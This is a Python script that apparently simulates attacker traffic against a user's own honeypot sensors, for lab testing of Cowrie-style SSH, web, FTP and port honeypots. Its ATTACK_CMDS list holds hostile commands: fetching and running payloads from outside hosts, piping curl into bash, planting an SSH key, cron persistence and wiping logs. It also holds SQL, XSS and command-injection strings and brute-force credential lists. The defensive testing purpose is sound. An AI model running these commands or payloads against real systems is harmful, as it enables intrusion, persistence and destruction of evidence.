#!/usr/bin/env python3
"""
Honeypot traffic simulator — AUTHORIZED LAB USE ONLY.

Generates attacker-style traffic against your own honeypot sensors so they have
something to capture: HTTP recon/injection, SSH brute-force + post-login
commands, FTP logins, and port-scanner probes.

Only run this against honeypots you own or are explicitly authorized to test.

Usage:
    python honeypot_traffic.py --host 192.168.72.130
    python honeypot_traffic.py --host 192.168.72.130 --only ssh,web
    python honeypot_traffic.py --host 192.168.72.130 --rounds 3

Requirements:
    pip install paramiko requests
"""
import argparse
import socket
import sys
import time

# ----------------------------------------------------------------------------
# Credentials the bundled Cowrie userdb accepts (username -> a valid password).
# These produce real shell sessions so the honeypot logs post-login commands.
# If you customized userdb.txt, update these.
# ----------------------------------------------------------------------------
SSH_VALID = [
    ("root", "HoneyTrap2026!"), ("root", "AtlasNode91"),
    ("admin", "CedarRoot88"), ("ubuntu", "DeltaForge73"),
    ("oracle", "EmberStack64"), ("postgres", "FalconMesh52"),
    ("git", "GraniteKey47"), ("pi", "IronVector28"),
]
# Common spray creds that should FAIL (captured as brute-force attempts).
SSH_INVALID = [
    ("root", "root"), ("root", "123456"), ("root", "password"),
    ("admin", "admin"), ("ubuntu", "ubuntu"), ("pi", "raspberry"),
]

# Attacker-style post-login commands (recon, malware drop, persistence, anti-forensics).
ATTACK_CMDS = [
    "uname -a",
    "whoami; id",
    "cat /etc/passwd",
    "cat /proc/cpuinfo | grep model",
    "ps aux",
    "netstat -an",
    "wget http://185.220.101.5/x86_64 -O /tmp/.x; chmod +x /tmp/.x; ./tmp/.x",
    "curl -s http://malware.example/install.sh | bash",
    "echo 'ssh-rsa AAAAB3Nza...attacker' >> /root/.ssh/authorized_keys",
    "crontab -l; echo '* * * * * curl -s http://evil.example/m | bash' | crontab -",
    "history -c",
    "rm -rf /var/log/*",
]

WEB_PATHS = [
    "/admin", "/wp-login.php", "/.env", "/.git/config", "/phpmyadmin/",
    "/api/v1/users", "/../../../../etc/passwd", "/shell.php", "/wp-admin/",
    "/config.php", "/server-status", "/actuator/env", "/.aws/credentials",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
]
WEB_INJECTIONS = [
    "/search?q=' OR '1'='1",
    "/product?id=1 UNION SELECT username,password FROM users--",
    "/page?id=1; DROP TABLE users--",
    "/comment?text=<script>alert(document.cookie)</script>",
    "/ping?host=127.0.0.1;cat /etc/passwd",
    "/file?name=../../../../etc/shadow",
]
WEB_LOGINS = [
    ("admin", "admin"), ("admin", "password"), ("root", "toor"),
    ("administrator", "admin123"), ("admin", "letmein"), ("admin", "P@ssw0rd"),
]
WEB_UAS = ["sqlmap/1.7-dev", "Nikto/2.5", "zgrab/0.x", "masscan/1.3", "Mozilla/5.0"]

# Port honeypot: (port, label, payload bytes).
PORT_PROBES = [
    (6379, "Redis", b"PING\r\nINFO\r\nCONFIG GET dir\r\n"),
    (1433, "MSSQL", b"\x12\x01\x00\x34"),
    (3389, "RDP", b"\x03\x00\x00\x13\x0e\xe0\x00\x00"),
    (27017, "MongoDB", b"\x3a\x00\x00\x00"),
    (9200, "Elasticsearch", b"GET /_cat/indices HTTP/1.0\r\n\r\n"),
    (8888, "HTTP-alt", b"GET / HTTP/1.0\r\n\r\n"),
]
FTP_CREDS = [
    ("anonymous", "anonymous@"), ("ftp", "ftp"), ("admin", "admin"),
    ("root", "root123"), ("user", "password"), ("test", "test"),
]


def sim_web(host, http_port):
    import requests
    print(f"\n=== WEB ({host}:{http_port}) ===")
    base = f"http://{host}:{http_port}"
    sess = requests.Session()
    for i, path in enumerate(WEB_PATHS + WEB_INJECTIONS):
        ua = WEB_UAS[i % len(WEB_UAS)]
        try:
            r = sess.get(base + path, headers={"User-Agent": ua}, timeout=5, allow_redirects=False)
            print(f"  GET {path[:50]:50} -> {r.status_code}")
        except Exception as e:
            print(f"  GET {path[:50]:50} -> err {e}")
    for u, p in WEB_LOGINS:
        try:
            sess.post(base + "/login", data={"username": u, "password": p}, timeout=5, allow_redirects=False)
            print(f"  POST /login {u}:{p}")
        except Exception as e:
            print(f"  POST /login {u}:{p} -> err {e}")


def sim_ssh(host, ssh_port):
    import paramiko
    print(f"\n=== SSH ({host}:{ssh_port}) ===")
    for u, p in SSH_INVALID:
        _ssh_try(paramiko, host, ssh_port, u, p, run_cmds=False)
        time.sleep(0.3)
    for u, p in SSH_VALID:
        _ssh_try(paramiko, host, ssh_port, u, p, run_cmds=True)
        time.sleep(0.4)


def _ssh_try(paramiko, host, port, user, pwd, run_cmds):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=user, password=pwd, timeout=8,
                       allow_agent=False, look_for_keys=False, banner_timeout=8)
        if run_cmds:
            print(f"  [+] LOGIN OK  {user}:{pwd}  -> commands")
            for cmd in ATTACK_CMDS:
                try:
                    _, out, _ = client.exec_command(cmd, timeout=6)
                    out.read()
                except Exception:
                    pass
                time.sleep(0.2)
        else:
            print(f"  [+] LOGIN OK  {user}:{pwd}")
    except paramiko.AuthenticationException:
        print(f"  [-] auth failed  {user}:{pwd}")
    except Exception as e:
        print(f"  [!] error {user}:{pwd} -> {e}")
    finally:
        try:
            client.close()
        except Exception:
            pass


def sim_ports(host):
    print(f"\n=== PORT SCANNER ({host}) ===")
    for port, label, payload in PORT_PROBES:
        try:
            s = socket.create_connection((host, port), timeout=4)
            s.sendall(payload)
            time.sleep(0.2)
            s.close()
            print(f"  [+] {label:14} :{port}")
        except Exception as e:
            print(f"  [-] {label:14} :{port} -> {e}")


def sim_ftp(host):
    print(f"\n=== FTP ({host}:21) ===")
    for u, p in FTP_CREDS:
        try:
            s = socket.create_connection((host, 21), timeout=5)
            s.recv(256)  # banner
            s.sendall(f"USER {u}\r\n".encode()); time.sleep(0.15); s.recv(256)
            s.sendall(f"PASS {p}\r\n".encode()); time.sleep(0.15); resp = s.recv(256)
            s.sendall(b"SYST\r\n"); time.sleep(0.1)
            s.sendall(b"LIST\r\n"); time.sleep(0.1)
            s.sendall(b"QUIT\r\n")
            s.close()
            print(f"  [+] {u}:{p} -> {resp.decode(errors='replace').strip()}")
        except Exception as e:
            print(f"  [-] {u}:{p} -> {e}")


def main():
    ap = argparse.ArgumentParser(description="Honeypot traffic simulator (authorized lab use only).")
    ap.add_argument("--host", required=True, help="Honeypot IP/hostname")
    ap.add_argument("--only", default="web,ssh,ports,ftp",
                    help="Comma list of sims to run: web,ssh,ports,ftp")
    ap.add_argument("--http-port", type=int, default=80)
    ap.add_argument("--ssh-port", type=int, default=22, help="Cowrie port (NOT the real sshd)")
    ap.add_argument("--rounds", type=int, default=1, help="Repeat the whole run N times")
    args = ap.parse_args()

    sims = {s.strip() for s in args.only.split(",") if s.strip()}
    print(f"Honeypot traffic simulator -> {args.host}  (sims: {', '.join(sorted(sims))}, rounds: {args.rounds})")

    for r in range(args.rounds):
        if args.rounds > 1:
            print(f"\n########## ROUND {r + 1}/{args.rounds} ##########")
        if "web" in sims:
            try:
                sim_web(args.host, args.http_port)
            except ImportError:
                print("  [!] 'requests' not installed; skipping web (pip install requests)")
        if "ssh" in sims:
            try:
                sim_ssh(args.host, args.ssh_port)
            except ImportError:
                print("  [!] 'paramiko' not installed; skipping ssh (pip install paramiko)")
        if "ports" in sims:
            sim_ports(args.host)
        if "ftp" in sims:
            sim_ftp(args.host)

    print("\nDone. Check the dashboard: Web Attacks, Sessions/Commands/Credentials, "
          "Network Honeypots (FTP / Port Scan), and Threats.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(130)
